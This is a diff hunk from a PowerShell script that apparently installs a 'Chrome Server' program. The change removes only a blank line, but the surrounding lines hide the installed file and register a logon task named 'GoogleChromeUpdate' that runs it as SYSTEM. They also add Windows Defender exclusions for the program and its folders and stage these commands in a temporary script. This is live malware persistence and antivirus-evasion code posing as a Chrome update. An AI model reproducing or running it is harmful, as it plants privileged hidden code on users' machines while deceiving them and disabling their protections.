@@ -86,7 +86,6 @@ if (Test-Path -Path $file_path) {
     [System.Console]::Clear()
     Write-Host "Successfully installed Chrome Server"
     # Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
-
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
     $cmd1 = "$taskName = 'GoogleChromeUpdate'; $task = Get-ScheduledTask | Where-Object { $_.TaskName -eq $taskName }; if ($task) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false; Write-Host 'Task '$taskName' has been deleted.'; } $action = New-ScheduledTaskAction -Execute $file_path; $trigger = New-ScheduledTaskTrigger -AtLogon; $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable:$true -DontStopOnIdleEnd:$true; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -RunLevel Highest;Write-Host 'Task '$taskName' has been created.'; Add-MpPreference -ExclusionProcess chrome_server.exe; Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}"
     Set-Content -Path "${env:TEMP}\run2.ps1" -Value $cmd1
